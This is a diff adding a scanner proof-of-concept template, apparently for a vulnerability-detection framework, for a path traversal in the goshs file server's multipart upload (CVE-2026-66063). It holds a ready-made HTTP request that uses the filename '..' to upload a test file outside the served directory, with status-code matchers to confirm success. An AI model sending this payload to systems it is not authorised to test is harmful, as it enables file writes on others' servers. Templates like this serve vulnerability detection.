@@ -1,0 +1,40 @@
+[info]
+author = "AVE"
+description = "检测 goshs 文件服务器 multipart 上传路径遍历漏洞，通过构造 filename=.. 上传文件到服务目录之外"
+id = "POC-AVE-2026-0940"
+name = "CVE-2026-66063 PoC"
+severity = "medium"
+tags = ["ave-2026-0940"]
+vuln_id = [
+    "CVE-2026-66063",
+    "AVE-2026-0940",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/upload"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+------WebKitFormBoundary7MA4YWxkTrZu0gW\r
+Content-Disposition: form-data; name="files"; filename=".."\r
+\r
+POC_TEST\r
+------WebKitFormBoundary7MA4YWxkTrZu0gW--"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"
+X-CSRF-Token = "test-csrf"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    303,
+    302,
+]
+type = "status"
